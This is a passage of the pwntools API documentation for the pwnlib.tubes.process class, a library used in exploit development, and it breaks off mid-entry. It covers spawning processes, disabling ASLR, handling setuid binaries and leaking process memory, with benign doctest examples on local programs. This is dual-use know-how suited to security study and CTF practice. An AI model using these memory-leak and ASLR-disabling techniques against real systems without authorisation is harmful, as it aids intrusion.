<span id="pwnlib-tubes-process-processes"></span><h5><a class="reference internal" href="#module-pwnlib.tubes.process" title="pwnlib.tubes.process"><code class="xref py py-mod docutils literal"><span class="pre">pwnlib.tubes.process</span></code></a> &#8212; Processes<a class="headerlink" href="#module-pwnlib.tubes.process" title="Permalink to this headline">¶</a></h5>
<dl class="class">
<dt id="pwnlib.tubes.process.process">
<em class="property">class </em><code class="descclassname">pwnlib.tubes.process.</code><code class="descname">process</code><span class="sig-paren">(</span><em>argv=None</em>, <em>shell=False</em>, <em>executable=None</em>, <em>cwd=None</em>, <em>env=None</em>, <em>stdin=-1</em>, <em>stdout=&lt;pwnlib.tubes.process.PTY object&gt;</em>, <em>stderr=-2</em>, <em>close_fds=True</em>, <em>preexec_fn=&lt;function &lt;lambda&gt;&gt;</em>, <em>raw=True</em>, <em>aslr=None</em>, <em>setuid=None</em>, <em>where='local'</em>, <em>display=None</em>, <em>alarm=None</em>, <em>*args</em>, <em>**kwargs</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process" title="Permalink to this definition">¶</a></dt>
<dd><p>Bases: <a class="reference internal" href="index.html#pwnlib.tubes.tube.tube" title="pwnlib.tubes.tube.tube"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.tube.tube</span></code></a></p>
<p>Spawns a new process, and wraps it with a tube for communication.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first simple">
<li><strong>argv</strong> (<a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; List of arguments to pass to the spawned process.</li>
<li><strong>shell</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Set to <cite>True</cite> to interpret <cite>argv</cite> as a string
to pass to the shell for interpretation instead of as argv.</li>
<li><strong>executable</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Path to the binary to execute.  If <code class="xref py py-const docutils literal"><span class="pre">None</span></code>, uses <code class="docutils literal"><span class="pre">argv[0]</span></code>.
Cannot be used with <code class="docutils literal"><span class="pre">shell</span></code>.</li>
<li><strong>cwd</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Working directory.  Uses the current working directory by default.</li>
<li><strong>env</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/stdtypes.html#dict" title="(in Python v2.7)"><em>dict</em></a>) &#8211; Environment variables.  By default, inherits from Python&#8217;s environment.</li>
<li><strong>stdin</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; File object or file descriptor number to use for <code class="docutils literal"><span class="pre">stdin</span></code>.
By default, a pipe is used.  A pty can be used instead by setting
this to <code class="docutils literal"><span class="pre">PTY</span></code>.  This will cause programs to behave in an
interactive manner (e.g.., <code class="docutils literal"><span class="pre">python</span></code> will show a <code class="docutils literal"><span class="pre">&gt;&gt;&gt;</span></code> prompt).
If the application reads from <code class="docutils literal"><span class="pre">/dev/tty</span></code> directly, use a pty.</li>
<li><strong>stdout</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; File object or file descriptor number to use for <code class="docutils literal"><span class="pre">stdout</span></code>.
By default, a pty is used so that any stdout buffering by libc
routines is disabled.
May also be <code class="docutils literal"><span class="pre">PIPE</span></code> to use a normal pipe.</li>
<li><strong>stderr</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; File object or file descriptor number to use for <code class="docutils literal"><span class="pre">stderr</span></code>.
By default, <code class="docutils literal"><span class="pre">STDOUT</span></code> is used.
May also be <code class="docutils literal"><span class="pre">PIPE</span></code> to use a separate pipe,
although the <a class="reference internal" href="index.html#pwnlib.tubes.tube.tube" title="pwnlib.tubes.tube.tube"><code class="xref py py-class docutils literal"><span class="pre">pwnlib.tubes.tube.tube</span></code></a> wrapper will not be able to read this data.</li>
<li><strong>close_fds</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Close all open file descriptors except stdin, stdout, stderr.
By default, <code class="xref py py-const docutils literal"><span class="pre">True</span></code> is used.</li>
<li><strong>preexec_fn</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#callable" title="(in Python v2.7)"><em>callable</em></a>) &#8211; Callable to invoke immediately before calling <code class="docutils literal"><span class="pre">execve</span></code>.</li>
<li><strong>raw</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Set the created pty to raw mode (i.e. disable echo and control
characters).  <code class="xref py py-const docutils literal"><span class="pre">True</span></code> by default.  If no pty is created, this
has no effect.</li>
<li><strong>aslr</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; <p>If set to <code class="xref py py-const docutils literal"><span class="pre">False</span></code>, disable ASLR via <code class="docutils literal"><span class="pre">personality</span></code> (<code class="docutils literal"><span class="pre">setarch</span> <span class="pre">-R</span></code>)
and <code class="docutils literal"><span class="pre">setrlimit</span></code> (<code class="docutils literal"><span class="pre">ulimit</span> <span class="pre">-s</span> <span class="pre">unlimited</span></code>).</p>
<p>This disables ASLR for the target process.  However, the <code class="docutils literal"><span class="pre">setarch</span></code>
changes are lost if a <code class="docutils literal"><span class="pre">setuid</span></code> binary is executed.</p>
<p>The default value is inherited from <code class="docutils literal"><span class="pre">context.aslr</span></code>.
See <code class="docutils literal"><span class="pre">setuid</span></code> below for additional options and information.</p>
</li>
<li><strong>setuid</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; <p>Used to control <cite>setuid</cite> status of the target binary, and the
corresponding actions taken.</p>
<p>By default, this value is <code class="xref py py-const docutils literal"><span class="pre">None</span></code>, so no assumptions are made.</p>
<p>If <code class="xref py py-const docutils literal"><span class="pre">True</span></code>, treat the target binary as <code class="docutils literal"><span class="pre">setuid</span></code>.
This modifies the mechanisms used to disable ASLR on the process if
<code class="docutils literal"><span class="pre">aslr=False</span></code>.
This is useful for debugging locally, when the exploit is a
<code class="docutils literal"><span class="pre">setuid</span></code> binary.</p>
<p>If <code class="xref py py-const docutils literal"><span class="pre">False</span></code>, prevent <code class="docutils literal"><span class="pre">setuid</span></code> bits from taking effect on the
target binary.  This is only supported on Linux, with kernels v3.5
or greater.</p>
</li>
<li><strong>where</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#str" title="(in Python v2.7)"><em>str</em></a>) &#8211; Where the process is running, used for logging purposes.</li>
<li><strong>display</strong> (<a class="reference internal" href="index.html#pwnlib.protocols.adb.AdbClient.list" title="pwnlib.protocols.adb.AdbClient.list"><em>list</em></a>) &#8211; List of arguments to display, instead of the main executable name.</li>
<li><strong>alarm</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Set a SIGALRM alarm timeout on the process.</li>
</ul>
</td>
</tr>
<tr class="field-even field"><th class="field-name">Variables:</th><td class="field-body"><p class="first last"><a class="reference internal" href="index.html#module-pwnlib.util.proc" title="pwnlib.util.proc"><strong>proc</strong></a> (<a class="reference external" href="https://docs.python.org/2.7/library/subprocess.html#module-subprocess" title="(in Python v2.7)"><em>subprocess</em></a>) &#8211; </p>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Examples</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;python2&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;print &#39;Hello world&#39;&quot;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;print &#39;Wow, such data&#39;&quot;</span><span class="p">);</span>
<span class="gp">&gt;&gt;&gt; </span><span class="s1">&#39;&#39;</span> <span class="o">==</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.01</span><span class="p">)</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">shutdown</span><span class="p">(</span><span class="s1">&#39;send&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">proc</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">closed</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">connected</span><span class="p">(</span><span class="s1">&#39;send&#39;</span><span class="p">)</span>
<span class="go">False</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;Hello world\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)</span>
<span class="go">&#39;Wow,&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvregex</span><span class="p">(</span><span class="s1">&#39;.*data&#39;</span><span class="p">)</span>
<span class="go">&#39; such data&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;\n&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span> 
<span class="gt">Traceback (most recent call last):</span>
<span class="c">...</span>
<span class="gr">EOFError</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;cat&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">d</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/dev/urandom&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>
<span class="go">&#39;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvrepeat</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span> <span class="o">==</span> <span class="n">d</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mf">0.1</span><span class="p">)</span>
<span class="go">&#39;&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">shutdown</span><span class="p">(</span><span class="s1">&#39;send&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">wait_for_close</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">poll</span><span class="p">()</span>
<span class="go">0</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;cat /dev/zero | head -c8&#39;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;/dev/null&#39;</span><span class="p">,</span> <span class="s1">&#39;w+&#39;</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;\x00\x00\x00\x00\x00\x00\x00\x00&#39;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;python&#39;</span><span class="p">,</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span><span class="s1">&#39;import os; print os.read(2,1024)&#39;</span><span class="p">],</span>
<span class="gp">... </span>            <span class="n">preexec_fn</span> <span class="o">=</span> <span class="k">lambda</span><span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;hello\n&#39;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">stack_smashing</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;python&#39;</span><span class="p">,</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span><span class="s1">&#39;open(&quot;/dev/tty&quot;,&quot;wb&quot;).write(&quot;stack smashing detected&quot;)&#39;</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">process</span><span class="p">(</span><span class="n">stack_smashing</span><span class="p">)</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;stack smashing detected&#39;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">process</span><span class="p">(</span><span class="n">stack_smashing</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;&#39;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">getpass</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;python&#39;</span><span class="p">,</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span><span class="s1">&#39;import getpass; print getpass.getpass(&quot;XXX&quot;)&#39;</span><span class="p">]</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">getpass</span><span class="p">,</span> <span class="n">stdin</span><span class="o">=</span><span class="n">PTY</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="go">&#39;XXX&#39;</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;hunter2&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;\nhunter2\n&#39;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;echo hello 1&gt;&amp;2&#39;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;hello\n&#39;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;echo hello 1&gt;&amp;2&#39;</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">PIPE</span><span class="p">)</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="go">&#39;&#39;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">a</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;cat&#39;</span><span class="p">,</span> <span class="s1">&#39;/proc/self/maps&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">b</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;cat&#39;</span><span class="p">,</span> <span class="s1">&#39;/proc/self/maps&#39;</span><span class="p">],</span> <span class="n">aslr</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="k">with</span> <span class="n">context</span><span class="o">.</span><span class="n">local</span><span class="p">(</span><span class="n">aslr</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
<span class="gp">... </span>   <span class="n">c</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;cat&#39;</span><span class="p">,</span> <span class="s1">&#39;/proc/self/maps&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">a</span> <span class="o">==</span> <span class="n">b</span>
<span class="go">False</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">b</span> <span class="o">==</span> <span class="n">c</span>
<span class="go">True</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">process</span><span class="p">([</span><span class="s1">&#39;sh&#39;</span><span class="p">,</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span><span class="s1">&#39;ulimit -s&#39;</span><span class="p">],</span> <span class="n">aslr</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="go">&#39;unlimited\n&#39;</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;sh&#39;</span><span class="p">,</span><span class="s1">&#39;-c&#39;</span><span class="p">,</span><span class="s1">&#39;sleep 10; exit 7&#39;</span><span class="p">],</span> <span class="n">alarm</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">io</span><span class="o">.</span><span class="n">poll</span><span class="p">(</span><span class="n">block</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGALRM</span>
<span class="go">True</span>
</pre></div>
</div>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="o">.</span><span class="n">from_assembly</span><span class="p">(</span><span class="s1">&#39;nop&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;mips&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
</pre></div>
</div>
<dl class="method">
<dt id="pwnlib.tubes.process.process.communicate">
<code class="descname">communicate</code><span class="sig-paren">(</span><em>stdin = None</em><span class="sig-paren">)</span> &#x2192; str<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py#L666-672"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.communicate" title="Permalink to this definition">¶</a></dt>
<dd><p>Calls <a class="reference external" href="https://docs.python.org/2.7/library/subprocess.html#subprocess.Popen.communicate" title="(in Python v2.7)"><code class="xref py py-meth docutils literal"><span class="pre">subprocess.Popen.communicate()</span></code></a> method on the process.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.process.process.kill">
<code class="descname">kill</code><span class="sig-paren">(</span><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py#L627-632"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.kill" title="Permalink to this definition">¶</a></dt>
<dd><p>Kills the process.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.process.process.leak">
<code class="descname">leak</code><span class="sig-paren">(</span><em>address</em>, <em>count=1</em><span class="sig-paren">)</span><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py#L929-959"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.leak" title="Permalink to this definition">¶</a></dt>
<dd><p>Leaks memory within the process at the specified address.</p>
<table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><ul class="first last simple">
<li><strong>address</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Address to leak memory at</li>
<li><strong>count</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#int" title="(in Python v2.7)"><em>int</em></a>) &#8211; Number of bytes to leak at that address.</li>
</ul>
</td>
</tr>
</tbody>
</table>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
</pre></div>
</div>
<p>In order to make sure there&#8217;s not a race condition against
the process getting set up...</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;echo hello&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;hello&#39;</span><span class="p">)</span>
<span class="go">&#39;hello&#39;</span>
</pre></div>
</div>
<p>Now we can leak some data!</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">leak</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
<span class="go">&#39;\x7fELF&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.process.process.libs">
<code class="descname">libs</code><span class="sig-paren">(</span><span class="sig-paren">)</span> &#x2192; dict<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py#L832-869"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.libs" title="Permalink to this definition">¶</a></dt>
<dd><p>Return a dictionary mapping the path of each shared library loaded
by the process to the address it is loaded at in the process&#8217; address
space.</p>
<p>If <code class="docutils literal"><span class="pre">/proc/$PID/maps</span></code> for the process cannot be accessed, the output
of <code class="docutils literal"><span class="pre">ldd</span></code> alone is used.  This may give inaccurate results if ASLR
is enabled.</p>
</dd></dl>

<dl class="method">
<dt id="pwnlib.tubes.process.process.poll">
<code class="descname">poll</code><span class="sig-paren">(</span><em>block = False</em><span class="sig-paren">)</span> &#x2192; int<a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py#L634-664"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.poll" title="Permalink to this definition">¶</a></dt>
<dd><table class="docutils field-list" frame="void" rules="none">
<col class="field-name" />
<col class="field-body" />
<tbody valign="top">
<tr class="field-odd field"><th class="field-name">Parameters:</th><td class="field-body"><strong>block</strong> (<a class="reference external" href="https://docs.python.org/2.7/library/functions.html#bool" title="(in Python v2.7)"><em>bool</em></a>) &#8211; Wait for the process to exit</td>
</tr>
</tbody>
</table>
<p>Poll the exit code of the process. Will return None, if the
process has not yet finished and the exit code otherwise.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.process.process.alarm">
<code class="descname">alarm</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.alarm" title="Permalink to this definition">¶</a></dt>
<dd><p>Alarm timeout of the process</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.process.process.argv">
<code class="descname">argv</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.argv" title="Permalink to this definition">¶</a></dt>
<dd><p>Arguments passed on argv</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.process.process.aslr">
<code class="descname">aslr</code><em class="property"> = None</em><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.aslr" title="Permalink to this definition">¶</a></dt>
<dd><p>Whether ASLR should be left on</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.process.process.corefile">
<code class="descname">corefile</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.corefile" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns a corefile for the process.</p>
<p>If the process is alive, attempts to create a coredump with GDB.</p>
<p>If the process is dead, attempts to locate the coredump created
by the kernel.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.process.process.cwd">
<code class="descname">cwd</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.cwd" title="Permalink to this definition">¶</a></dt>
<dd><p>Directory that the process is working in.</p>
<p class="rubric">Example</p>
<div class="highlight-default"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;sh&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;cd /tmp; echo AAA&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;AAA&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">cwd</span> <span class="o">==</span> <span class="s1">&#39;/tmp&#39;</span>
<span class="go">True</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;cd /proc; echo BBB;&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">_</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;BBB&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">p</span><span class="o">.</span><span class="n">cwd</span>
<span class="go">&#39;/proc&#39;</span>
</pre></div>
</div>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.process.process.elf">
<code class="descname">elf</code><a class="reference external" href="https://github.com/Gallopsled/pwntools/blob/3.10.0/pwnlib/tubes/process.py"><span class="viewcode-link">[source]</span></a><a class="headerlink" href="#pwnlib.tubes.process.process.elf" title="Permalink to this definition">¶</a></dt>
<dd><p>Returns an ELF file for the executable that launched the process.</p>
</dd></dl>

<dl class="attribute">
<dt id="pwnlib.tubes.process.process.env">
